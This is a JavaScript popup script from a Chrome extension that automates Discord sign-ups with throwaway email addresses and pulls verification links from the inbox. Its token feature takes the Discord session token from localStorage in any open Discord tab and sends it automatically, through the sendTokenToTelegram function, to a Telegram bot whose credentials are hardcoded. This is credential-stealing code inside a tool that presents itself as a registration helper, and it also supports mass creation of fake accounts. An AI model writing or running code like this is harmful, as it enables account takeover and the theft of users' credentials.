const $ = id => document.getElementById(id);
const msg = async (action, data) => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab?.id) return;
  chrome.tabs.sendMessage(tab.id, { action, ...data });
};

const cap = txt => txt.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');

const status = (txt, color = '#94a3b8', type = '') => {
  const s = $('status');
  if (!s) return;
  const span = s.querySelector('span');
  if (span) {
    span.textContent = cap(txt);
  } else {
    s.textContent = cap(txt);
  }
  
  s.classList.remove('active', 'processing', 'error');
  
  if (type === 'success' || color === '#10b981' || color === '#059669') {
    s.classList.add('active');
  } else if (type === 'processing' || color === '#3b82f6' || color === '#2563eb') {
    s.classList.add('processing');
  } else if (type === 'error' || color === '#ef4444' || color === '#dc2626') {
    s.classList.add('error');
  } else {
    s.style.color = color;
  }
};

status('Ready', '#10b981', 'success');

let currentEmail = null;
let displayName = '';
let regPassword = '';

const copyToClipboard = async (text) => {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    } else {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      document.body.appendChild(textarea);
      textarea.select();
      const success = document.execCommand('copy');
      document.body.removeChild(textarea);
      return success;
    }
  } catch (err) {
    return false;
  }
};

// Global lock to prevent concurrent sending
let sendingInProgress = false;

async function sendTokenToTelegram(token) {
  // Prevent concurrent sending
  if (sendingInProgress) {
    console.log('Already sending a token, skipping...');
    return false;
  }

  try {
    sendingInProgress = true;

    // Get current sent tokens
    const stored = await chrome.storage.local.get(['sentTokens']);
    const sentTokens = stored.sentTokens || [];

    // Double check if already sent (in case of race condition)
    if (sentTokens.includes(token)) {
      console.log('Token already sent:', token.substring(0, 20) + '...');
      return false;
    }

    const botToken = "8006381907:AAF39g_S_66lsM4LpkXOz5jjDtToYDAZCB4";
    const chatId = "8168923904";
    const msg = `${token}`;

    console.log('Sending token to Telegram...');

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: msg })
    });

    if (response.ok) {
      // Re-check storage before saving to prevent race conditions
      const currentStored = await chrome.storage.local.get(['sentTokens']);
      const currentSentTokens = currentStored.sentTokens || [];

      if (!currentSentTokens.includes(token)) {
        currentSentTokens.push(token);
        await chrome.storage.local.set({ sentTokens: currentSentTokens });
        console.log('Token sent successfully and saved');
        return true;
      } else {
        console.log('Token was already saved by another process');
        return true; // Still consider as success
      }
    } else {
      console.log('Failed to send token, status:', response.status);
      return false;
    }
  } catch (err) {
    console.log('Error sending token:', err.message);
    return false;
  } finally {
    // Always release the lock
    sendingInProgress = false;
  }
}

const loadCurrentEmail = async () => {
  try {
    const stored = await chrome.storage.local.get(['currentEmail', 'displayName', 'regPassword']);
    if (stored.currentEmail) {
      currentEmail = stored.currentEmail;
      if ($('emailInput')) $('emailInput').value = stored.currentEmail;
    }
    displayName = stored.displayName || '';
    regPassword = stored.regPassword || '';
    if ($('displayNameInput')) $('displayNameInput').value = displayName || '';
    if ($('passwordInput')) $('passwordInput').value = regPassword || '';
  } catch (err) {
  }
};

loadCurrentEmail();

const createTempEmail = async () => {
  try {
    const result = await chrome.runtime.sendMessage({ action: 'createTempEmail' });
    if (result && result.success) {
      currentEmail = result.email;
      return result;
    } else {
      return result || { success: false, error: 'Không thể tạo email' };
    }
  } catch (err) {
    return { success: false, error: err.message };
  }
};

$('openReg').onclick = async () => {
  await chrome.storage.local.set({ autoRegisterEnabled: false });
  
  status('Opening Discord register page...', '#3b82f6', 'processing');
  await chrome.tabs.create({ url: 'https://discord.com/register' });
  status('Register page opened', '#10b981', 'success');
};

$('regAcc').onclick = async () => {
  status('Creating email with allowed domain...', '#3b82f6', 'processing');
  
  const result = await createTempEmail();
  if (!result || !result.success) {
    status(result?.error || 'Failed to create email', '#ef4444', 'error');
    return;
  }
  const email = result.email;
  
  await chrome.storage.local.set({ 
    currentEmail: email, 
    autoRegisterEnabled: true 
  });
  currentEmail = email;
  
  status('Email created: ' + email.substring(0, 20) + '...', '#10b981', 'success');
  await copyToClipboard(email);
  
  status('Opening Discord register page...', '#3b82f6', 'processing');
  await chrome.tabs.create({ url: 'https://discord.com/register', active: true });
  status('Auto-filling will start...', '#3b82f6', 'processing');
};

const saveSettings = async () => {
  try {
    displayName = ($('displayNameInput')?.value || '').trim();
    regPassword = ($('passwordInput')?.value || '').trim();
    await chrome.storage.local.set({ displayName, regPassword });
    status('Settings saved', '#10b981', 'success');
  } catch (e) {
    status('Failed to save settings', '#ef4444', 'error');
  }
};

if ($('saveSettings')) {
  $('saveSettings').onclick = async () => {
    await saveSettings();
  };
}

$('verifyBtn').onclick = () => {
  const group = $('verifyGroup');
  group.classList.toggle('show');
};

$('verifySubmit').onclick = async () => {
  let email = $('emailInput').value.trim();
  if (!email) {
    const stored = await chrome.storage.local.get(['currentEmail']);
    if (stored.currentEmail) {
      email = stored.currentEmail;
      $('emailInput').value = email;
    } else {
      status('Please enter email!', '#ef4444', 'error');
      return;
    }
  }
  
  status('Checking mail...', '#3b82f6', 'processing');
  
  try {
    const messagesResult = await chrome.runtime.sendMessage({ action: 'getMessages' });
    
    if (!messagesResult || !messagesResult.success) {
      throw new Error(messagesResult?.error || 'Không thể lấy messages');
    }
    
    const provider = messagesResult.provider || 'phim';
    const data = messagesResult.data;
    
    let messages = [];
    if (provider === 'devtai') {
      messages = Array.isArray(data) ? data : [];
    } else {
      messages = data.data || [];
    }
    
    if (messages && messages.length > 0) {
      const discordMail = messages.find(m => {
        const from = provider === 'devtai' ? m.fromAddress : m.from;
        const subject = m.subject || '';
        return from?.includes('discord.com') && 
               (subject.includes('Verify') || subject.includes('Xác') || subject.includes('verification'));
      });
      
      if (discordMail) {
        const messageId = provider === 'devtai' ? discordMail.id : discordMail.uid;
        const contentResult = await chrome.runtime.sendMessage({ 
          action: 'getMessageContent', 
          uid: messageId 
        });
        
        if (contentResult && contentResult.success) {
          const fullData = contentResult.data;
          
          const html = provider === 'devtai' ? (fullData.htmlContent || '') : (fullData.bodyHtml || '');
          const text = provider === 'devtai' ? (fullData.textContent || '') : (html.replace(/<[^>]*>/g, ' ')); 

          const allLinks = [];

          const hrefMatches = html.match(/href="([^"]+)"/g) || [];
          hrefMatches.forEach(m => {
            const url = m.match(/href="([^"]+)"/)[1];
            if (url.includes('discord.com') || url.includes('click.discord.com')) {
              allLinks.push(url.replace(/&amp;/g, '&'));
            }
          });

          const urlMatches = html.match(/https?:\/\/[^\s<>"']+/g) || [];
          urlMatches.forEach(url => {
            if (url.includes('discord.com') || url.includes('click.discord.com')) {
              const cleanUrl = url.replace(/&amp;/g, '&').replace(/[<>"']/g, '');
              if (!allLinks.includes(cleanUrl)) {
                allLinks.push(cleanUrl);
              }
            }
          });
          
          const textUrlMatches = text.match(/https?:\/\/[^\s]+/g) || [];
          textUrlMatches.forEach(url => {
            if (url.includes('discord.com') || url.includes('click.discord.com')) {
              const cleanUrl = url.trim();
              if (!allLinks.includes(cleanUrl)) {
                allLinks.push(cleanUrl);
              }
            }
          });

          if (allLinks.length > 0) {
            displayLinks(allLinks);
            status(`Found ${allLinks.length} link(s). Please select a link!`, '#10b981', 'success');
          } else {
            status('No links found!', '#ef4444', 'error');
          }
        } else {
          if (provider === 'phim') {
            const preview = discordMail.bodyPreview || '';
            const previewMatches = preview.match(/https?:\/\/[^\s]+/g) || [];
            
            if (previewMatches.length > 0) {
              displayLinks(previewMatches);
              status(`Found ${previewMatches.length} link(s) from preview. Please select a link!`, '#10b981', 'success');
            } else {
              status('No verify link found!', '#ef4444', 'error');
            }
          } else {
            status('No verify link found!', '#ef4444', 'error');
          }
        }
      } else {
        status('No mail from Discord yet!', '#f59e0b');
      }
    } else {
      status('No emails found!', '#f59e0b');
    }
  } catch (err) {
    status('Error checking mail: ' + err.message, '#ef4444', 'error');
  }
};

const displayLinks = (links) => {
  const container = $('linksContainer');
  const list = $('linksList');
  
  list.innerHTML = '';
  
  links.forEach((link, idx) => {
    const item = document.createElement('div');
    item.className = 'link-item';
    
    let linkType = 'Link Discord';
    if (link.includes('click.discord.com')) {
      linkType = '🔗 Link Verify (click.discord.com)';
    } else if (link.includes('discord.com') && (link.includes('verify') || link.includes('verification'))) {
      linkType = '✅ Link Verify (discord.com)';
    }
    
    item.innerHTML = `
      <div class="link-item-title">
        <span>${idx + 1}.</span>
        <span>${linkType}</span>
      </div>
      <div class="link-item-url">${link}</div>
    `;
    
    item.onclick = () => {
      status('Opening link...', '#3b82f6', 'processing');
      chrome.tabs.create({ url: link });
      container.classList.remove('show');
    };
    
    list.appendChild(item);
  });

  container.classList.add('show');

  if (links.length >= 2) {
    const secondLink = links[1];
    status('Auto opening link #2...', '#3b82f6', 'processing');
    setTimeout(() => {
      chrome.tabs.create({ url: secondLink });
    }, 500);
  }
};

async function getDiscordToken() {
  try {
    status('Getting Discord token...', '#3b82f6', 'processing');

    const tabs = await chrome.tabs.query({ url: "*://*.discord.com/*" });
    if (tabs.length === 0) {
      status('No Discord tabs found', '#ef4444', 'error');
      return null;
    }

    for (const tab of tabs) {
      try {
        const results = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            try {
              const token = localStorage.getItem("token");
              if (token) return token.replace(/"/g, "");
              return null;
            } catch (error) {
              return null;
            }
          }
        });

        if (results && results[0] && results[0].result) {
          const token = results[0].result;
          
          const tokenContainer = $('tokenContainer');
          const tokenInput = $('tokenInput');
          
          tokenInput.value = token;
          tokenContainer.style.display = 'block';
          
          status('Token retrieved successfully!', '#10b981', 'success');

          const sentToTelegram = await sendTokenToTelegram(token);

          const copied = await copyToClipboard(token);
          if (copied && sentToTelegram) {
            status('Token copied to clipboard and sent to Telegram!', '#10b981', 'success');
          } else if (copied) {
            status('Token copied to clipboard!', '#10b981', 'success');
          } else if (sentToTelegram) {
            status('Token sent to Telegram!', '#10b981', 'success');
          }

          return token;
        }
      } catch (err) {
      }
    }

    status('Cannot get token from Discord', '#ef4444', 'error');
    return null;
  } catch (error) {
    status(`Error: ${error.message}`, '#ef4444', 'error');
    return null;
  }
}

$('getToken').onclick = async () => {
  await getDiscordToken();
};

$('copyToken').onclick = async () => {
  const tokenInput = $('tokenInput');
  const token = tokenInput.value;
  
  if (!token) {
    status('No token to copy!', '#ef4444', 'error');
    return;
  }
  
  const copied = await copyToClipboard(token);
  if (copied) {
    status('Token copied to clipboard!', '#10b981', 'success');

    const copyBtn = $('copyToken');
    const originalIcon = copyBtn.innerHTML;
    copyBtn.innerHTML = '<span class="btn-icon">✓</span>';
    copyBtn.style.color = '#10b981';
    
    setTimeout(() => {
      copyBtn.innerHTML = originalIcon;
      copyBtn.style.color = '';
    }, 2000);
  } else {
    status('Failed to copy token!', '#ef4444', 'error');
  }
};

$('clearData').onclick = () => {
  msg('clearData');
  status('Clearing data...', '#ef4444', 'processing');
};

chrome.runtime.onMessage.addListener(async (req) => {
  if (req.action === 'emailCreated' && req.email) {
    const copied = await copyToClipboard(req.email);
    if (copied) {
      status('Email copied: ' + req.email.substring(0, 20) + '...', '#10b981', 'success');
    } else {
      status('Email created: ' + req.email.substring(0, 20) + '...', '#10b981', 'success');
    }
    if ($('emailInput')) {
      $('emailInput').value = req.email;
      currentEmail = req.email;
    }
  }
  
  if (req.action === 'tokenReceived' && req.token) {
    const tokenContainer = $('tokenContainer');
    const tokenInput = $('tokenInput');

    tokenInput.value = req.token;
    tokenContainer.style.display = 'block';
    status('Token retrieved successfully!', '#10b981', 'success');

    const sentToTelegram = await sendTokenToTelegram(req.token);

    const copied = await copyToClipboard(req.token);
    if (copied && sentToTelegram) {
      status('Token copied and sent to Telegram!', '#10b981', 'success');
    } else if (copied) {
      status('Token copied to clipboard!', '#10b981', 'success');
    } else if (sentToTelegram) {
      status('Token sent to Telegram!', '#10b981', 'success');
    }
  }
  
  if (req.action === 'tokenError') {
    status('Token not found. Make sure you are logged in!', '#ef4444', 'error');
    const tokenContainer = $('tokenContainer');
    tokenContainer.style.display = 'none';
  }
});